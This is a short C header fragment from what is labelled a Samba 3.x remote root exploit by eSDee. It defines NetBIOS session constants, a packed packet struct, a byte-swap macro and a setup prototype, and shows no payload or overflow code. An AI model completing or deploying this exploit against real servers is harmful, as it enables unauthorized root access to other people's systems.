/*
 .oooooo..o                              .o8                 oooo       ooooo ooooo ooooo
d8P'    `Y8                             "888                 `888       `888' `888' `888'
Y88bo.       .oooo.   ooo. .oo.  .oo.    888oooo.   .oooo.    888        888   888   888
 `"Y8888o.  `P  )88b  `888P"Y88bP"Y88b   d88' `88b `P  )88b   888        888   888   888
     `"Y88b  .oP"888   888   888   888   888   888  .oP"888   888        888   888   888
oo     .d8P d8(  888   888   888   888   888   888 d8(  888   888        888   888   888
8""88888P'  `Y888""8o o888o o888o o888o  `Y8bod8P' `Y888""8o o888o      o888o o888o o888o

  sambal III: samba 3.x.x remote root exploit                  by eSDee (esdee@netric.org)

*/

#define CALLING_NAME            "[w00p]"
#define SERVER                  0x20
#define WORKSTATION             0x00

#define NB_SSN_MESSAGE          0x00
#define NB_SSN_REQUEST          0x81
#define NB_SSN_POSRESP          0x82
#define NB_SSN_NEGRESP          0x83
#define NB_SSN_RTGRESP          0x84
#define NB_SSN_KEEPALIVE        0x85

struct NBT_header {
        uint8_t         NBT_type;
        uint8_t         NBT_flags;
        uint16_t        NBT_length;
};

typedef struct {
        unsigned char type;
        unsigned char flags;
        unsigned short length;
        unsigned char called[34];
        unsigned char calling[34];
} __attribute__ ((packed)) nbt_packet;

#define bswap16(x) \
((((x) >> 8) & 0xff) | (((x) & 0xff) << 8))

int NBT_session_setup(struct SMB_session *session);
